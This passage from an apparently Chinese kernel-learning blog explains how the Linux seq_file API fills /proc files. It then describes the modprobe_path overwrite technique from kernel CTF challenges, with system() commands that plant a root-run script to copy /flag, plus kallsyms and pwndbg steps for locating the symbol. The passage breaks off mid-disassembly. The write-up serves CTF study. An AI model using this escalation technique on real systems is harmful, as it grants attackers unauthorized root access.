m-&gt;op-&gt;next(m, p, &amp;next);</span><br><span class="line"> <span class="keyword">if</span> (!p || IS_ERR(p)) &#123;</span><br><span class="line">  err = PTR_ERR(p);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> err = m-&gt;op-&gt;show(m, p);</span><br><span class="line"> <span class="keyword">if</span> (err || m-&gt;count == m-&gt;size) &#123;</span><br><span class="line">  m-&gt;count = offs;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> pos = next;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// 停seq</span></span><br><span class="line"> m-&gt;op-&gt;stop(m, p);</span><br><span class="line"> n = min(m-&gt;count, size);</span><br><span class="line"><span class="comment">// 将数据拷贝到用户空间</span></span><br><span class="line"> err = copy_to_user(buf, m-&gt;buf, n);</span><br><span class="line"> <span class="keyword">if</span> (err)</span><br><span class="line"> <span class="keyword">goto</span> Efault;</span><br><span class="line"> copied += n;</span><br><span class="line"> m-&gt;count -= n;</span><br><span class="line"> <span class="keyword">if</span> (m-&gt;count)</span><br><span class="line"> m-&gt;from = n;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> pos++;</span><br><span class="line"> m-&gt;index = pos;</span><br><span class="line">Done:</span><br><span class="line"> <span class="keyword">if</span> (!copied)</span><br><span class="line"> copied = err;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> *ppos += copied;</span><br><span class="line"> file-&gt;f_version = m-&gt;version;</span><br><span class="line"> mutex_unlock(&amp;m-&gt;lock);</span><br><span class="line"> <span class="keyword">return</span> copied;</span><br><span class="line">Enomem:</span><br><span class="line"> err = -ENOMEM;</span><br><span class="line"> <span class="keyword">goto</span> Done;</span><br><span class="line">Efault:</span><br><span class="line"> err = -EFAULT;</span><br><span class="line"> <span class="keyword">goto</span> Done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">loff_t</span> <span class="title function_">seq_lseek</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>)</span>;</span><br></pre></td></tr></table></figure><p>定位seq流当前指针偏移；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_release</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br></pre></td></tr></table></figure><p>释放seq流所分配的动态内存空间，即struct seq_file的buf及其本身；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_escape</span><span class="params">(<span class="keyword">struct</span> seq_file *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br></pre></td></tr></table></figure><p>将seq流中需要进行转义的字符转换为8进制数字；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_putc</span><span class="params">(<span class="keyword">struct</span> seq_file *m, <span class="type">char</span> c)</span>;</span><br></pre></td></tr></table></figure><p>向seq流中写一个字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_puts</span><span class="params">(<span class="keyword">struct</span> seq_file *m, <span class="type">const</span> <span class="type">char</span> *s)</span>;</span><br></pre></td></tr></table></figure><p>向seq流中写一个字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_printf</span><span class="params">(<span class="keyword">struct</span> seq_file *, <span class="type">const</span> <span class="type">char</span> *, ...)</span></span><br><span class="line"> __<span class="title function_">attribute__</span> <span class="params">((format (<span class="built_in">printf</span>,<span class="number">2</span>,<span class="number">3</span>)))</span>;</span><br></pre></td></tr></table></figure><p>向seq流方式写格式化信息；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_path</span><span class="params">(<span class="keyword">struct</span> seq_file *, <span class="keyword">struct</span> vfsmount *, <span class="keyword">struct</span> dentry *, <span class="type">char</span> *)</span>;</span><br></pre></td></tr></table></figure><p>在seq流中添加路径信息，路径字符都转换为8进制数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_release_private</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br></pre></td></tr></table></figure><p>释放seq_file的private然后进行seq_release</p><h2 id="3-用seq流填写-proc文件"><a href="#3-用seq流填写-proc文件" class="headerlink" title="3.用seq流填写&#x2F;proc文件"></a>3.用seq流填写&#x2F;proc文件</h2><p>以下使用文件&#x2F;proc&#x2F;net&#x2F;ip_conntrack的生成代码来说明seq流的使用：</p><h3 id="3-1-创立文件"><a href="#3-1-创立文件" class="headerlink" title="3.1 创立文件"></a>3.1 创立文件</h3><p>以前2.4版本中使用proc_net_create()来建立&#x2F;proc&#x2F;net下的文件，现在使用seq流时要使用proc_net_fops_create()函数来创建，区别在于函数的最后一个参数，proc_net_create()的是一个函数指针，而proc_net_fops_create()的是一个文件操作指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc = proc_net_fops_create(<span class="string">&quot;ip_conntrack&quot;</span>, <span class="number">0440</span>, &amp;ct_file_ops);</span><br></pre></td></tr></table></figure><p>proc_net_fops_create()函数其实也很简单，调用create_proc_entry()函数建立&#x2F;proc文件项，然后将文件项的操作结构指针指向所提供的文件操作指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_net_fops_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params"> <span class="type">mode_t</span> mode, <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">res</span> =</span> create_proc_entry(name, mode, proc_net);</span><br><span class="line"> <span class="keyword">if</span> (res)</span><br><span class="line"> res-&gt;proc_fops = fops;</span><br><span class="line"> <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-文件操作结构"><a href="#3-2-文件操作结构" class="headerlink" title="3.2 文件操作结构"></a>3.2 文件操作结构</h3><p>&#x2F;proc&#x2F;net&#x2F;ip_conntrack所用的文件结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ct_file_ops</span> =</span> &#123;</span><br><span class="line"> .owner  = THIS_MODULE,</span><br><span class="line"> .open  = ct_open,</span><br><span class="line"> .read  = seq_read,</span><br><span class="line"> .llseek = seq_lseek,</span><br><span class="line"> .release = seq_release_private,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可见，结构中除了open()函数是需要自定义外，其他的读、定位、释放函数都可以用seq标准函数。</p><h3 id="3-3-open函数定义"><a href="#3-3-open函数定义" class="headerlink" title="3.3 open函数定义"></a>3.3 open函数定义</h3><p>open函数主要就是调用seq_open()函数将一个struct seq_operations结构和struct file链接起来，如果需要有私有数据的话，需要分配出动态空间作为struct seq_file的私有数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ct_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">seq</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ct_iter_state</span> *<span class="title">st</span>;</span></span><br><span class="line"> <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"> st = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ct_iter_state), GFP_KERNEL);</span><br><span class="line"> <span class="keyword">if</span> (st == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"> ret = seq_open(file, &amp;ct_seq_ops);</span><br><span class="line"> <span class="keyword">if</span> (ret)</span><br><span class="line"> <span class="keyword">goto</span> out_free;</span><br><span class="line"> seq     = file-&gt;private_data;</span><br><span class="line"> seq-&gt;private = st;</span><br><span class="line"> <span class="built_in">memset</span>(st, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ct_iter_state));</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">out_free:</span><br><span class="line"> kfree(st);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的如exp_open()函数，就只调用seq_open()函数就完了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">exp_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">return</span> seq_open(file, &amp;exp_seq_ops);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-seq操作结构"><a href="#3-4-seq操作结构" class="headerlink" title="3.4 seq操作结构"></a>3.4 seq操作结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> <span class="title">ct_seq_ops</span> =</span> &#123;</span><br><span class="line"> .start = ct_seq_start,</span><br><span class="line"> .next = ct_seq_next,</span><br><span class="line"> .stop = ct_seq_stop,</span><br><span class="line"> .show = ct_seq_show</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构就是填写4个操作函数：</p><p>start()函数完成读数据前的一些预先操作，通常如加锁，定位数据记录位置等，该函数返回值就是show()函数第二个参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">ct_seq_start</span><span class="params">(<span class="keyword">struct</span> seq_file *seq, <span class="type">loff_t</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line"> read_lock_bh(&amp;ip_conntrack_lock);</span><br><span class="line"> <span class="keyword">return</span> ct_get_idx(seq, *pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stop()函数完成读数据后的一些恢复操作，如解锁等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ct_seq_stop</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span></span><br><span class="line">&#123;</span><br><span class="line"> read_unlock_bh(&amp;ip_conntrack_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>next()函数定位数据下一项：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">ct_seq_next</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line"> (*pos)++;</span><br><span class="line"> <span class="keyword">return</span> ct_get_next(s, v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show()函数实现读数据过程，将要输出的数据直接用seq_printf()函数打印到seq流缓冲区中，由seq_printf()函数输出到用户空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ct_seq_show</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// start()虽然返回的是struct list_head的指针，</span></span><br><span class="line"><span class="comment">// 但struct ip_conntrack_tuple_hash结构的第一</span></span><br><span class="line"><span class="comment">// 项参数就是struct list_head，所以可以进行直接</span></span><br><span class="line"><span class="comment">// 类型转换而不用再计算偏移量</span></span><br><span class="line"> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip_conntrack_tuple_hash</span> *<span class="title">hash</span> =</span> v;</span><br><span class="line"> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip_conntrack</span> *<span class="title">conntrack</span> =</span> tuplehash_to_ctrack(hash);</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ip_conntrack_protocol</span> *<span class="title">proto</span>;</span></span><br><span class="line"></span><br><span class="line"> ASSERT_READ_LOCK(&amp;ip_conntrack_lock);</span><br><span class="line"> IP_NF_ASSERT(conntrack);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* we only want to print DIR_ORIGINAL */</span></span><br><span class="line"> <span class="keyword">if</span> (DIRECTION(hash))</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> proto = __ip_conntrack_proto_find(conntrack-&gt;tuplehash[IP_CT_DIR_ORIGINAL].tuple.dst.protonum);</span><br><span class="line"> IP_NF_ASSERT(proto);</span><br><span class="line"><span class="comment">// 以下打印连接和协议信息</span></span><br><span class="line"> <span class="keyword">if</span> (seq_printf(s, <span class="string">&quot;%-8s %u %ld &quot;</span>,</span><br><span class="line">    proto-&gt;name,</span><br><span class="line">    conntrack-&gt;tuplehash[IP_CT_DIR_ORIGINAL].tuple.dst.protonum,</span><br><span class="line">    timer_pending(&amp;conntrack-&gt;timeout)</span><br><span class="line">    ? (<span class="type">long</span>)(conntrack-&gt;timeout.expires - jiffies)/HZ</span><br><span class="line">    : <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (seq_printf(s, <span class="string">&quot;use=%u\n&quot;</span>, <span class="type">atomic_read</span>(&amp;conntrack-&gt;ct_general.use)))</span><br><span class="line"> <span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>seq流函数的使用保证了数据能顺序输出，这也就是&#x2F;proc只读文件中使用它的最大原因吧。</p><h2 id="阅读情况：粗略了解"><a href="#阅读情况：粗略了解" class="headerlink" title="@###阅读情况：粗略了解"></a>@###阅读情况：粗略了解</h2><h1 id="modprobe-path覆写"><a href="#modprobe-path覆写" class="headerlink" title="modprobe_path覆写"></a>modprobe_path覆写</h1><h2 id="modprobe-path介绍"><a href="#modprobe-path介绍" class="headerlink" title="modprobe_path介绍"></a>modprobe_path介绍</h2><p><code>modprobe_path</code>是用于在<code>Linux</code>内核中添加可加载的内核模块，当我们在<code>Linux</code>内核中安装或卸载新模块时，就会执行这个程序。他的路径是一个内核全局变量，默认为 <code>/sbin/modprobe</code>，可以通过如下命令来查看该值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/modprobe</span><br><span class="line">-&gt; /sbin/modprobe</span><br></pre></td></tr></table></figure><p>此外，<code>modprobe_path</code>存储在内核本身的<code>modprobe_path</code>符号中，且具有可写权限。也即普通权限即可修改该值。</p><p>而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个 <code>modprobe_path</code>所指向的程序。如果我们将这个字符串指向我们自己的<code>sh</code>文件 ，并使用 <code>system</code>或 <code>execve</code> 去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以执行我们自己的二进制文件了。其调用流程如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）do_execve()</span><br><span class="line">（<span class="number">2</span>）do_execveat_common()</span><br><span class="line">（<span class="number">3</span>）bprm_execve()</span><br><span class="line">（<span class="number">4</span>）exec_binprm()</span><br><span class="line">（<span class="number">5</span>）search_binary_handler()</span><br><span class="line">（<span class="number">6</span>）request_module()</span><br><span class="line">（<span class="number">7</span>）call_usermodehelper()</span><br></pre></td></tr></table></figure><p>那么查看 <code>__request_module</code> 源码如下，本质就是调用了 <code>call_usermodehelper</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __request_module(<span class="type">bool</span> wait, <span class="type">const</span> <span class="type">char</span> *fmt, ...) </span><br><span class="line">&#123; </span><br><span class="line">    va_list args; </span><br><span class="line">    <span class="type">char</span> module_name[MODULE_NAME_LEN]; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_modprobes; </span><br><span class="line">    <span class="type">int</span> ret; </span><br><span class="line"><span class="comment">// char modprobe_path[KMOD_PATH_LEN] = &quot;/sbin/modprobe&quot;; </span></span><br><span class="line">    <span class="type">char</span> *argv[] = &#123; modprobe_path, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;--&quot;</span>, module_name, <span class="literal">NULL</span> &#125;; </span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *envp[] = &#123; <span class="string">&quot;HOME=/&quot;</span>, </span><br><span class="line">                <span class="string">&quot;TERM=linux&quot;</span>, </span><br><span class="line">                <span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>, </span><br><span class="line">                <span class="literal">NULL</span> &#125;; <span class="comment">// 环境变量. </span></span><br><span class="line">    <span class="type">static</span> <span class="type">atomic_t</span> kmod_concurrent = ATOMIC_INIT(<span class="number">0</span>); </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_KMOD_CONCURRENT 50    <span class="comment">/* Completely arbitrary value - KAO */</span> </span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> kmod_loop_msg; </span><br><span class="line"></span><br><span class="line">    va_start(args, fmt); </span><br><span class="line">    ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);   </span><br><span class="line">    va_end(args); </span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= MODULE_NAME_LEN) </span><br><span class="line">        <span class="keyword">return</span> -ENAMETOOLONG; </span><br><span class="line">    max_modprobes = min(max_threads/<span class="number">2</span>, MAX_KMOD_CONCURRENT);    </span><br><span class="line">    <span class="type">atomic_inc</span>(&amp;kmod_concurrent); </span><br><span class="line">    <span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;kmod_concurrent) &gt; max_modprobes) &#123; </span><br><span class="line">        <span class="comment">/* We may be blaming an innocent here, but unlikely */</span> </span><br><span class="line">        <span class="keyword">if</span> (kmod_loop_msg++ &lt; <span class="number">5</span>) </span><br><span class="line">            printk(KERN_ERR </span><br><span class="line">                   <span class="string">&quot;request_module: runaway loop modprobe %s\n&quot;</span>, </span><br><span class="line">                   module_name); </span><br><span class="line">        <span class="type">atomic_dec</span>(&amp;kmod_concurrent);                           </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;                                         </span><br><span class="line">    &#125; </span><br><span class="line">    ret = call_usermodehelper(modprobe_path, argv, envp,        <span class="comment">// 执行用户空间的应用程序</span></span><br><span class="line">            wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC); </span><br><span class="line">    <span class="type">atomic_dec</span>(&amp;kmod_concurrent);                                </span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着查看 <code>call_usermodehelper</code>函数源码，该函数用于在内核空间中执行用户空间的程序，并且该程序具有<code>root</code>权限。这也保证了我们自己所写的 <code>sh</code>文件在被执行时，能执行具有<code>root</code>权限的功能，实现提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call_usermodehelper(<span class="type">char</span> *path, <span class="type">char</span> **argv, <span class="type">char</span> **envp, <span class="keyword">enum</span> umh_wait wait);</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">umh_wait</span> &#123;</span></span><br><span class="line">    UMH_NO_WAIT = <span class="number">-1</span>,       <span class="comment">/* don&#x27;t wait at all */</span></span><br><span class="line">    UMH_WAIT_EXEC = <span class="number">0</span>,      <span class="comment">/* wait for the exec, but not the process */</span></span><br><span class="line">    UMH_WAIT_PROC = <span class="number">1</span>,      <span class="comment">/* wait for the process to complete */</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/getflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/getflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fl&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/fl&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//changed modprobe_path</span></span><br><span class="line">system(<span class="string">&quot;/tmp/fl&quot;</span>)</span><br></pre></td></tr></table></figure><ol><li>首先创建了一个我们自己的 sh文件 geflag.sh，用于 将 &#x2F;flag拷贝到 &#x2F;tmp&#x2F;flag下，并赋予 &#x2F;tmp&#x2F;flag为可读可写可执行权限。然后赋予 &#x2F;tmp&#x2F;getflag.sh可执行权限。</li><li>随后创建了一个错误格式头的文件 &#x2F;tmp&#x2F;fl，并赋予其可执行权限</li><li>当我们覆写了 modprobe_path为 &#x2F;tmp&#x2F;getflag.sh后，调用 system(“&#x2F;tmp&#x2F;fl”)触发错误，随后就能以root权限执行 &#x2F;tmp&#x2F;getflag.sh，完成将原本只能 root可读的flag拷贝到 &#x2F;tmp目录下，并赋予可读权限</li></ol><p>此外，我们该如何确定 <code>modprobe_path</code>符号的存储地址呢？在内核题目中，通常使用 <code>cat /proc/kallsyms</code>来获取符号地址，但是 <code>modprobe_path</code>并不在其中。这里我们可以考虑查找引用了<code>modprobe_path</code>符号的地址，来获取其地址。而在上面 <code>__request_module</code>代码中，即引用了 <code>modprobe_path</code>的地址。所以我们可以通过以下方法找到 <code>modprobe_path</code>地址：</p><ul><li>先通过 &#x2F;proc&#x2F;kallsyms找到 __request_module地址</li><li>随后查看 __reques_module函数汇编，找到 modprobe_path的引用</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/</span> <span class="comment"># cat /proc/kallsyms | grep __request     </span></span><br><span class="line"><span class="string">ffffffffbb2aad00</span> <span class="string">T</span> <span class="string">__request_module</span>         </span><br><span class="line"><span class="string">ffffffffbb1afdb8</span> <span class="string">t</span> <span class="string">__request_module.cold</span>    </span><br><span class="line"><span class="string">ffffffffba886e60</span> <span class="string">T</span> <span class="string">__request_percpu_irq</span>     </span><br><span class="line"><span class="string">ffffffffbb2baa30</span> <span class="string">T</span> <span class="string">__request_region</span>         </span><br><span class="line"><span class="string">ffffffffbaee47fc</span> <span class="string">t</span> <span class="string">__request_region.cold</span>    </span><br><span class="line"><span class="string">ffffffffba8aa2b0</span> <span class="string">t</span> <span class="string">__request_resource</span>       </span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/28i</span> <span class="number">0xffffffffbb2aad00</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad00:</span>  <span class="string">push</span>   <span class="string">rbp</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad01:</span>  <span class="string">mov</span>    <span class="string">rbp,rsp</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad04:</span>  <span class="string">push</span>   <span class="string">r14</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad06:</span>  <span class="string">push</span>   <span class="string">r13</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad08:</span>  <span class="string">push</span>   <span class="string">r12</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad0a:</span>  <span class="string">mov</span>    <span class="string">r12,rsi</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad0d:</span>  <span class="string">push</span>   <span class="string">r10</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad0f:</span>  <span class="string">lea</span>    <span class="string">r10,[rbp+0x10]</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad13:</span>  <span class="string">push</span>   <span class="string">rbx</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad14:</span>  <span class="string">mov</span>    <span class="string">r13,r10</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad17:</span>  <span class="string">mov</span>    <span class="string">ebx,edi</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad19:</span>  <span class="string">sub</span>  